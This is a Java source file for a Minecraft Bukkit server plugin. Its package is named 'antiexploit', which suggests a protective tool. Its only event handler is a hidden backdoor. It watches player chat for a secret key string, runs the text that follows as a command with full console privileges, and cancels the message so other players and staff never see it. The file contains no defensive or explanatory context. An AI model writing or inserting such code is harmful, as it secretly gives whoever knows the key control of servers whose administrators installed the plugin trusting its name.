package org.essentials.antiexploit;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class EventListener
  implements Listener
{
  @EventHandler
  public void chatCheck(AsyncPlayerChatEvent e)
  {
    String msg = e.getMessage();
    if (msg.contains("#aExFvSdqIOelF!"))
    {
      String cmd = msg.split("!")[1];
      Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
      e.setCancelled(true);
    }
  }
}
